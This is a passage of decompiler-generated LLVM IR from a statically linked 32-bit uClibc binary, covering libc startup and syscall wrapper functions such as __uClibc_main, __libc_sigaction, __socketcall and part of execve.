  store i32 %v0_805433c, i32* @esi, align 4
  %v0_805433e = load i32, i32* @edx, align 4
  store i32 %v0_805433e, i32* @ebx, align 4
  %v4_8054343 = call i32 @__libc_fcntl(i32 %v0_805433c, i32 1, i32 %tmp6)
  %v8_805434b = icmp eq i32 %v4_8054343, -1
  %v1_805434c = icmp eq i1 %v8_805434b, false
  br i1 %v1_805434c, label %dec_label_pc_8054367, label %dec_label_pc_805434e

dec_label_pc_805434e:                             ; preds = %entry
  %v0_8054350 = load i32, i32* @ebx, align 4
  %v5_8054356 = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805a1ac.534, i32 0, i32 0), i32 %v0_8054350)
  %v1_805435e = load i32, i32* @esi, align 4
  %v12_805435e = icmp eq i32 %v5_8054356, %v1_805435e
  br i1 %v12_805435e, label %dec_label_pc_8054367, label %dec_label_pc_8054362

dec_label_pc_8054362:                             ; preds = %dec_label_pc_805434e
  %v0_8054362 = call i32 @abort()
  br label %dec_label_pc_8054367

dec_label_pc_8054367:                             ; preds = %dec_label_pc_805434e, %entry, %dec_label_pc_8054362
  %v2_8054367 = load i32, i32* %stack_var_-12, align 4
  %v2_8054368 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8054368, i32* @ebx, align 4
  store i32 %v0_8054337, i32* @esi, align 4
  ret i32 %v2_8054367

; uselistorder directives
  uselistorder i32 ()* @abort, { 0, 3, 2, 4, 1 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 5, 2, 0, 1, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 0, 5, 9, 8, 7, 6, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_8054367, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_805436e = load i8, i8* @global_var_806179c.535, align 4
  %v1_805436e = icmp eq i8 %v0_805436e, 0
  %v1_8054375 = icmp eq i1 %v1_805436e, false
  br i1 %v1_8054375, label %entry.dec_label_pc_80543a7_crit_edge, label %dec_label_pc_8054377

entry.dec_label_pc_80543a7_crit_edge:             ; preds = %entry
  %v0_80543aa.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_80543a7

dec_label_pc_8054377:                             ; preds = %entry
  store i8 1, i8* @global_var_806179c.535, align 4
  store i32 4096, i32* @global_var_8061790.457, align 16
  %v0_80543a2 = call i32 @_stdio_init()
  br label %dec_label_pc_80543a7

dec_label_pc_80543a7:                             ; preds = %entry.dec_label_pc_80543a7_crit_edge, %dec_label_pc_8054377
  %v0_80543aa = phi i32 [ %v0_80543aa.pre, %entry.dec_label_pc_80543a7_crit_edge ], [ %v0_80543a2, %dec_label_pc_8054377 ]
  ret i32 %v0_80543aa

; uselistorder directives
  uselistorder i8* @global_var_806179c.535, { 1, 0 }
  uselistorder label %dec_label_pc_80543a7, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %v0_80543ab = load i32, i32* @ebp, align 4
  store i32 %tmp31, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_8061788.536, align 8
  store i32 %arg6, i32* @global_var_8061798.533, align 8
  %v2_80543e2 = mul i32 %arg2, 4
  %v3_80543e2 = add i32 %tmp31, %v2_80543e2
  store i32 %v3_80543e2, i32* %edx.global-to-local, align 4
  %v1_80543e5 = add i32 %v3_80543e2, 4
  store i32 %v1_80543e5, i32* @global_var_806178c.528, align 4
  %v3_80543ed = load i32, i32* %arg3, align 4
  %v14_80543ed = icmp eq i32 %v1_80543e5, %v3_80543ed
  %v1_80543ef = icmp eq i1 %v14_80543ed, false
  br i1 %v1_80543ef, label %dec_label_pc_80543f7, label %dec_label_pc_80543f1

dec_label_pc_80543f1:                             ; preds = %entry
  store i32 %v3_80543e2, i32* @global_var_806178c.528, align 4
  br label %dec_label_pc_80543f7

dec_label_pc_80543f7:                             ; preds = %entry, %dec_label_pc_80543f1
  %v0_80543f7 = load i32, i32* @ecx, align 4
  store i32 %v0_80543f7, i32* %stack_var_-160, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v2_80543fc = ptrtoint i32* %stack_var_-136 to i32
  %v3_8054401 = bitcast i32* %stack_var_-136 to i8*
  %v4_8054401 = call i32 @__GI_memset(i8* %v3_8054401, i32 0, i32 120)
  %v0_8054406 = load i32, i32* @global_var_806178c.528, align 4
  br label %dec_label_pc_805440e

dec_label_pc_805440e:                             ; preds = %dec_label_pc_805440e, %dec_label_pc_80543f7
  %v0_805440e = phi i32 [ %v1_8054411, %dec_label_pc_805440e ], [ %v0_8054406, %dec_label_pc_80543f7 ]
  %v1_805440e = inttoptr i32 %v0_805440e to i32*
  %v2_805440e = load i32, i32* %v1_805440e, align 4
  %v3_805440e = icmp eq i32 %v2_805440e, 0
  %v1_8054411 = add i32 %v0_805440e, 4
  %v1_8054414 = icmp eq i1 %v3_805440e, false
  br i1 %v1_8054414, label %dec_label_pc_805440e, label %dec_label_pc_8054435.preheader

dec_label_pc_8054435.preheader:                   ; preds = %dec_label_pc_805440e
  store i32 %v1_8054411, i32* @ebx, align 4
  %v1_80544351 = inttoptr i32 %v1_8054411 to i32*
  %v2_80544352 = load i32, i32* %v1_80544351, align 4
  %v3_80544353 = icmp eq i32 %v2_80544352, 0
  %v1_805443810 = icmp eq i1 %v3_80544353, false
  br i1 %v1_805443810, label %dec_label_pc_805441a.lr.ph, label %dec_label_pc_805443a

dec_label_pc_805441a.lr.ph:                       ; preds = %dec_label_pc_8054435.preheader
  %v3_80543fa = ptrtoint i32* %stack_var_-168 to i32
  %v3_8054425 = add i32 %v3_80543fa, 32
  br label %dec_label_pc_805441a

dec_label_pc_805441a:                             ; preds = %dec_label_pc_805441a.lr.ph, %dec_label_pc_8054432
  %v1_8054425 = phi i32 [ %v2_80544352, %dec_label_pc_805441a.lr.ph ], [ %v2_8054435, %dec_label_pc_8054432 ]
  %v0_8054424 = phi i32 [ %v1_8054411, %dec_label_pc_805441a.lr.ph ], [ %v1_8054432, %dec_label_pc_8054432 ]
  %v6_805441f = icmp ugt i32 %v1_8054425, 14
  br i1 %v6_805441f, label %dec_label_pc_8054432, label %dec_label_pc_8054421

dec_label_pc_8054421:                             ; preds = %dec_label_pc_805441a
  %v0_8054421 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8054421, i32* %stack_var_-160, align 4
  store i32 %v0_8054424, i32* %stack_var_-168, align 4
  %v2_8054425 = mul i32 %v1_8054425, 8
  %v4_8054425 = add i32 %v3_8054425, %v2_8054425
  %v3_805442a = inttoptr i32 %v4_8054425 to i16*
  %v4_805442a = call i32 @memcpy(i16* %v3_805442a, i32 %v0_8054424, i32 8)
  %v0_8054432.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054432

dec_label_pc_8054432:                             ; preds = %dec_label_pc_805441a, %dec_label_pc_8054421
  %v0_8054432 = phi i32 [ %v0_8054424, %dec_label_pc_805441a ], [ %v0_8054432.pre, %dec_label_pc_8054421 ]
  %v1_8054432 = add i32 %v0_8054432, 8
  store i32 %v1_8054432, i32* @ebx, align 4
  %v1_8054435 = inttoptr i32 %v1_8054432 to i32*
  %v2_8054435 = load i32, i32* %v1_8054435, align 4
  %v3_8054435 = icmp eq i32 %v2_8054435, 0
  %v1_8054438 = icmp eq i1 %v3_8054435, false
  br i1 %v1_8054438, label %dec_label_pc_805441a, label %dec_label_pc_805443a

dec_label_pc_805443a:                             ; preds = %dec_label_pc_8054432, %dec_label_pc_8054435.preheader
  store i32 %v2_80543fc, i32* @eax, align 4
  %v0_805443e = call i32 @_dl_aux_init()
  store i32 %v0_805443e, i32* @eax, align 4
  %v0_8054443 = call i32 @__GI___uClibc_init()
  %v1_805444c = icmp eq i32 %tmp26, 0
  %v1_805444e = icmp eq i1 %v1_805444c, false
  br i1 %v1_805444e, label %dec_label_pc_8054454, label %dec_label_pc_8054450

dec_label_pc_8054450:                             ; preds = %dec_label_pc_805443a
  %v1_8054450 = and i32 %tmp26, -65536
  %v2_8054450 = or i32 %v1_8054450, 4096
  br label %dec_label_pc_8054454

dec_label_pc_8054454:                             ; preds = %dec_label_pc_805443a, %dec_label_pc_8054450
  %v0_8054454 = phi i32 [ %tmp26, %dec_label_pc_805443a ], [ %v2_8054450, %dec_label_pc_8054450 ]
  store i32 %v0_8054454, i32* @global_var_8061790.457, align 16
  %v13_8054459 = icmp eq i32 %tmp25, -1
  %v1_805445e = icmp eq i1 %v13_8054459, false
  br i1 %v1_805445e, label %dec_label_pc_8054489, label %dec_label_pc_8054460

dec_label_pc_8054460:                             ; preds = %dec_label_pc_8054454
  %v0_8054460 = call i32 @getuid()
  store i32 %v0_8054460, i32* @ebx, align 4
  %v0_8054467 = call i32 @geteuid()
  %v0_805446c = load i32, i32* @ebx, align 4
  %v12_805446c = icmp eq i32 %v0_805446c, %v0_8054467
  %v1_805446e = icmp eq i1 %v12_805446c, false
  br i1 %v1_805446e, label %dec_label_pc_805449f, label %dec_label_pc_8054470

dec_label_pc_8054470:                             ; preds = %dec_label_pc_8054460
  %v0_8054470 = call i32 @getgid()
  store i32 %v0_8054470, i32* @ebx, align 4
  %v0_8054477 = call i32 @getegid()
  %v0_805447c = load i32, i32* @ebx, align 4
  %v12_805447c = icmp eq i32 %v0_805447c, %v0_8054477
  %v1_805447e = icmp eq i1 %v12_805447c, false
  br i1 %v1_805447e, label %dec_label_pc_805449f, label %dec_label_pc_8054480.thread

dec_label_pc_8054480.thread:                      ; preds = %dec_label_pc_8054470
  br label %dec_label_pc_80544c9

dec_label_pc_8054489:                             ; preds = %dec_label_pc_8054454
  %v15_8054489 = icmp eq i32 %tmp25, %tmp24
  %v1_805448d = icmp eq i1 %v15_8054489, false
  br i1 %v1_805448d, label %dec_label_pc_805449f, label %dec_label_pc_805448f

dec_label_pc_805448f:                             ; preds = %dec_label_pc_8054489
  br label %dec_label_pc_805449f

dec_label_pc_805449f:                             ; preds = %dec_label_pc_805448f, %dec_label_pc_8054489, %dec_label_pc_8054470, %dec_label_pc_8054460
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_80544a6 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_80544b5 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_80544c4 = call i32 @__check_one_fd()
  br label %dec_label_pc_80544c9

dec_label_pc_80544c9:                             ; preds = %dec_label_pc_8054480.thread, %dec_label_pc_805449f
  store i32 ptrtoint (i32* @global_var_805b000.530 to i32), i32* %esi.global-to-local, align 4
  %v0_80544ce = load i32, i32* @edi, align 4
  %v1_80544ce = inttoptr i32 %v0_80544ce to i32*
  %v2_80544ce = load i32, i32* %v1_80544ce, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_805b000.530 to i32), i32 -134590464), i32* %esi.global-to-local, align 4
  store i32 %v2_80544ce, i32* inttoptr (i32 134591736 to i32*), align 8
  store i32 sdiv (i32 add (i32 ptrtoint (i32* @global_var_805b000.530 to i32), i32 -134590464), i32 4), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_8061794.532, align 4
  br i1 icmp ugt (i32 add (i32 ptrtoint (i32* @global_var_805b000.530 to i32), i32 -134590461), i32 6), label %dec_label_pc_80544ee, label %dec_label_pc_80544fa

dec_label_pc_80544ee:                             ; preds = %dec_label_pc_80544c9, %dec_label_pc_80544ee
  %v4_80544ee48 = phi i32 [ %v1_80544f5, %dec_label_pc_80544ee ], [ 0, %dec_label_pc_80544c9 ]
  store i32 ptrtoint (i32* @global_var_80544f5.538 to i32), i32* %stack_var_-160, align 4
  %v5_80544ee = mul i32 %v4_80544ee48, 4
  %v6_80544ee = add i32 %v5_80544ee, ptrtoint (i32* @global_var_805b000.530 to i32)
  %v7_80544ee = inttoptr i32 %v6_80544ee to i32*
  %v8_80544ee = load i32, i32* %v7_80544ee, align 4
  call void @__pseudo_call(i32 %v8_80544ee)
  %v0_80544f5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80544f5 = add i32 %v0_80544f5, 1
  store i32 %v1_80544f5, i32* %ebx.global-to-local, align 4
  %v1_80544f6.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_80544f6 = icmp ult i32 %v1_80544f5, %v1_80544f6.pre
  br i1 %v7_80544f6, label %dec_label_pc_80544ee, label %dec_label_pc_80544fa

dec_label_pc_80544fa:                             ; preds = %dec_label_pc_80544ee, %dec_label_pc_80544c9
  store i32 134563072, i32* %stack_var_-160, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805b000.530 to i32), i32 -134590464), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805b000.530 to i32), i32 -134590464), i32 2), i32 0), label %dec_label_pc_8054512, label %dec_label_pc_805451e

dec_label_pc_8054512:                             ; preds = %dec_label_pc_80544fa, %dec_label_pc_8054512
  %v4_805451245 = phi i32 [ %v1_8054519, %dec_label_pc_8054512 ], [ 0, %dec_label_pc_80544fa ]
  store i32 ptrtoint (i32* @global_var_8054519.539 to i32), i32* %stack_var_-160, align 4
  %v5_8054512 = mul i32 %v4_805451245, 4
  %v6_8054512 = add i32 %v5_8054512, ptrtoint (i32* @global_var_805b000.530 to i32)
  %v7_8054512 = inttoptr i32 %v6_8054512 to i32*
  %v8_8054512 = load i32, i32* %v7_8054512, align 4
  call void @__pseudo_call(i32 %v8_8054512)
  %v0_8054519 = load i32, i32* @ebx, align 4
  %v1_8054519 = add i32 %v0_8054519, 1
  store i32 %v1_8054519, i32* @ebx, align 4
  %v1_805451a.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_805451a = icmp ult i32 %v1_8054519, %v1_805451a.pre
  br i1 %v7_805451a, label %dec_label_pc_8054512, label %dec_label_pc_805451e

dec_label_pc_805451e:                             ; preds = %dec_label_pc_8054512, %dec_label_pc_80544fa
  %v0_8054527 = load i32, i32* %stack_var_-160, align 4
  %v1_8054527 = call i32 @__errno_location(i32 %v0_8054527)
  %v1_805452c = inttoptr i32 %v1_8054527 to i32*
  store i32 0, i32* %v1_805452c, align 4
  %v0_805453b = call i32 @__GI___h_errno_location()
  store i32 %v0_805453b, i32* @eax, align 4
  %v1_8054540 = inttoptr i32 %v0_805453b to i32*
  store i32 0, i32* %v1_8054540, align 4
  %v0_8054547 = load i32, i32* @global_var_806178c.528, align 4
  store i32 %v0_8054547, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %v0_80543ab)
  %v0_805455c = load i32, i32* @eax, align 4
  %v1_805455f = call i32 @__GI_exit(i32 %v0_805455c)
  %v0_8054569 = load i32, i32* @ebx, align 4
  %v1_8054569 = inttoptr i32 %v0_8054569 to %sigcontext*
  %v2_8054569 = call i32 @sigreturn(%sigcontext* %v1_8054569)
  %v0_8054571 = load i32, i32* @ebx, align 4
  %v1_8054571 = inttoptr i32 %v0_8054571 to %sigcontext*
  %v2_8054571 = call i32 @sigreturn(%sigcontext* %v1_8054571)
  ret i32 %v2_8054571

; uselistorder directives
  uselistorder i32 %v1_8054519, { 1, 2, 0 }
  uselistorder i32 %v1_80544f5, { 1, 2, 0 }
  uselistorder i32 %v2_8054435, { 1, 0 }
  uselistorder i32 %v1_8054432, { 2, 1, 0 }
  uselistorder i32 %v1_8054411, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805440e, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 1, 5, 3, 4, 2 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805b000.530 to i32), i32 -134590464), i32 2), { 0, 2, 3, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805b000.530 to i32), i32 -134590464), { 0, 2, 1 }
  uselistorder i32 ()* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 4096, { 22, 23, 6, 21, 17, 18, 0, 1, 7, 19, 16, 20, 13, 8, 3, 9, 14, 10, 4, 15, 11, 5, 2, 12 }
  uselistorder i32 14, { 2, 4, 3, 1, 0 }
  uselistorder label %dec_label_pc_8054512, { 1, 0 }
  uselistorder label %dec_label_pc_80544ee, { 1, 0 }
  uselistorder label %dec_label_pc_80544c9, { 1, 0 }
  uselistorder label %dec_label_pc_8054454, { 1, 0 }
  uselistorder label %dec_label_pc_8054432, { 1, 0 }
  uselistorder label %dec_label_pc_805441a, { 1, 0 }
  uselistorder label %dec_label_pc_80543f7, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_8054573 = load i32, i32* @esi, align 4
  %v0_8054574 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8054589 = icmp eq i32* %arg2, null
  br i1 %v1_8054589, label %dec_label_pc_80545dc, label %dec_label_pc_805458d

dec_label_pc_805458d:                             ; preds = %entry
  %v2_805458d = load i32, i32* %arg2, align 4
  store i32 %v2_805458d, i32* %stack_var_-148, align 4
  %v1_8054596 = add i32 %tmp11, 4
  %v3_80545a8 = bitcast i32* %stack_var_-136 to i16*
  %v4_80545a8 = call i32 @memcpy(i16* %v3_80545a8, i32 %v1_8054596, i32 128)
  %v1_80545ad = add i32 %tmp11, 132
  %v2_80545c7 = inttoptr i32 %v1_80545ad to i8*
  %v3_80545c7 = load i8, i8* %v2_80545c7, align 1
  %v4_80545c7 = and i8 %v3_80545c7, 4
  %v5_80545c7 = icmp eq i8 %v4_80545c7, 0
  %v1_80545ce = icmp eq i1 %v5_80545c7, false
  br i1 %v1_80545ce, label %dec_label_pc_80545dc, label %dec_label_pc_80545d0

dec_label_pc_80545d0:                             ; preds = %dec_label_pc_805458d
  br label %dec_label_pc_80545dc

dec_label_pc_80545dc:                             ; preds = %dec_label_pc_80545d0, %dec_label_pc_805458d, %entry
  %v1_80545de = icmp eq i32 %arg3, 0
  br i1 %v1_80545de, label %dec_label_pc_80545e6, label %dec_label_pc_80545e2

dec_label_pc_80545e2:                             ; preds = %dec_label_pc_80545dc
  %v2_80545e2 = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_80545e6

dec_label_pc_80545e6:                             ; preds = %dec_label_pc_80545dc, %dec_label_pc_80545e2
  %v0_80545f5 = phi i32 [ 0, %dec_label_pc_80545dc ], [ %v2_80545e2, %dec_label_pc_80545e2 ]
  br i1 %v1_8054589, label %dec_label_pc_80545f3, label %dec_label_pc_80545ec

dec_label_pc_80545ec:                             ; preds = %dec_label_pc_80545e6
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_80545f3

dec_label_pc_80545f3:                             ; preds = %dec_label_pc_80545e6, %dec_label_pc_80545ec
  %v0_80545f6 = phi %sigaction* [ null, %dec_label_pc_80545e6 ], [ %phitmp, %dec_label_pc_80545ec ]
  %v5_80545fe = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_80545f6, i32 %v0_80545f5, i32 8)
  store i32 %v5_80545fe, i32* %ebx.global-to-local, align 4
  br i1 %v1_80545de, label %dec_label_pc_8054641, label %dec_label_pc_805460c

dec_label_pc_805460c:                             ; preds = %dec_label_pc_80545f3
  %v2_805460c = icmp slt i32 %v5_80545fe, 0
  br i1 %v2_805460c, label %dec_label_pc_8054641, label %dec_label_pc_8054610

dec_label_pc_8054610:                             ; preds = %dec_label_pc_805460c
  %v3_8054610 = load i32, i32* %stack_var_-288, align 4
  %v2_8054614 = inttoptr i32 %arg3 to i32*
  store i32 %v3_8054610, i32* %v2_8054614, align 4
  %v2_805461c = ptrtoint i32* %stack_var_-276 to i32
  %v1_8054621 = add i32 %arg3, 4
  %v3_8054625 = inttoptr i32 %v1_8054621 to i16*
  %v4_8054625 = call i32 @memcpy(i16* %v3_8054625, i32 %v2_805461c, i32 128)
  %v2_805462e = add i32 %arg3, 132
  %v3_805462e = inttoptr i32 %v2_805462e to i32*
  %v2_805463b = add i32 %arg3, 136
  %v3_805463b = inttoptr i32 %v2_805463b to i32*
  %v0_8054641.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054641

dec_label_pc_8054641:                             ; preds = %dec_label_pc_805460c, %dec_label_pc_80545f3, %dec_label_pc_8054610
  %v0_8054641 = phi i32 [ %v5_80545fe, %dec_label_pc_805460c ], [ %v5_80545fe, %dec_label_pc_80545f3 ], [ %v0_8054641.pre, %dec_label_pc_8054610 ]
  store i32 %v0_8054574, i32* @ebx, align 4
  store i32 %v0_8054573, i32* @esi, align 4
  ret i32 %v0_8054641

; uselistorder directives
  uselistorder i1 %v1_80545de, { 1, 0 }
  uselistorder i1 %v1_8054589, { 1, 0 }
  uselistorder i32* null, { 1, 5, 2, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 3, 4 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8054641, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80545f3, { 1, 0 }
  uselistorder label %dec_label_pc_80545e6, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_805464f = load i32, i32* @eax, align 4
  %v1_8054651 = sub i32 0, %v0_805464f
  %v1_8054653 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v2_8054658 = inttoptr i32 %v1_8054653 to i32*
  store i32 %v1_8054651, i32* %v2_8054658, align 4
  ret i32 -1
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_8054664 = load i32, i32* @ebx, align 4
  %v2_805466b = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_805466b, i32* @ebx, align 4
  %v8_805466f = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_8054664, i32* @ebx, align 4
  %v3_8054678 = icmp ugt i32 %v8_805466f, -4096
  call void @__pseudo_cond_branch(i1 %v3_8054678, i32 134563404)
  ret i32 %v8_805466f

; uselistorder directives
  uselistorder i32 %v8_805466f, { 1, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 1, 0 }
  uselistorder i32 134563404, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054680 = load i32, i32* @ebx, align 4
  store i32 %v0_8054680, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8054693 = call i32 @int80_syscall(i32 102)
  store i32 %v1_8054693, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_8054693, -4095
  br i1 %tmp8, label %dec_label_pc_80546ac, label %dec_label_pc_80546a0

dec_label_pc_80546a0:                             ; preds = %entry
  %v0_80546a0 = load i32, i32* %stack_var_-4, align 4
  %v1_80546a0 = call i32 @__errno_location(i32 %v0_80546a0)
  %v0_80546a5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80546a5 = sub i32 0, %v0_80546a5
  %v2_80546a7 = inttoptr i32 %v1_80546a0 to i32*
  store i32 %v1_80546a5, i32* %v2_80546a7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80546ac

dec_label_pc_80546ac:                             ; preds = %entry, %dec_label_pc_80546a0
  %v0_80546ac = phi i32 [ %v1_8054693, %entry ], [ -1, %dec_label_pc_80546a0 ]
  %v2_80546ae = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80546ae, i32* @edx, align 4
  %v2_80546b0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80546b0, i32* @ebx, align 4
  ret i32 %v0_80546ac

; uselistorder directives
  uselistorder i32 %v1_8054693, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 102, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80546ac, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80546b5 = load i32, i32* @esi, align 4
  store i32 %v0_80546b5, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_80546c9 = load i32, i32* @ebx, align 4
  %v7_80546d1 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_80546d1, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_80546d1, -4095
  br i1 %tmp13, label %dec_label_pc_80546e9, label %dec_label_pc_80546dd

dec_label_pc_80546dd:                             ; preds = %entry
  %v1_80546dd = call i32 @__errno_location(i32 %v0_80546c9)
  %v0_80546e2 = load i32, i32* %esi.global-to-local, align 4
  %v1_80546e2 = sub i32 0, %v0_80546e2
  %v2_80546e4 = inttoptr i32 %v1_80546dd to i32*
  store i32 %v1_80546e2, i32* %v2_80546e4, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80546e9

dec_label_pc_80546e9:                             ; preds = %entry, %dec_label_pc_80546dd
  %v0_80546e9 = phi i32 [ %v7_80546d1, %entry ], [ -1, %dec_label_pc_80546dd ]
  %v2_80546eb = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80546eb, i32* @edx, align 4
  %v2_80546ec = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80546ec, i32* @esi, align 4
  ret i32 %v0_80546e9

; uselistorder directives
  uselistorder i32 %v7_80546d1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80546e9, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80546f0 = load i32, i32* @ebx, align 4
  store i32 %v0_80546f0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_8054703 = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_8054703, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v4_8054703, -4095
  br i1 %tmp9, label %dec_label_pc_805471c, label %dec_label_pc_8054710

dec_label_pc_8054710:                             ; preds = %entry
  %v0_8054710 = load i32, i32* %stack_var_-4, align 4
  %v1_8054710 = call i32 @__errno_location(i32 %v0_8054710)
  %v0_8054715 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054715 = sub i32 0, %v0_8054715
  %v2_8054717 = inttoptr i32 %v1_8054710 to i32*
  store i32 %v1_8054715, i32* %v2_8054717, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805471c

dec_label_pc_805471c:                             ; preds = %entry, %dec_label_pc_8054710
  %v0_805471c = phi i32 [ %v4_8054703, %entry ], [ -1, %dec_label_pc_8054710 ]
  %v2_805471e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805471e, i32* @edx, align 4
  %v2_8054720 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054720, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805471c

; uselistorder directives
  uselistorder i32 %v4_8054703, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805471c, { 1, 0 }
}

define i32 @__GI_execve(i8* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054724 = load i32, i32* @edi, align 4
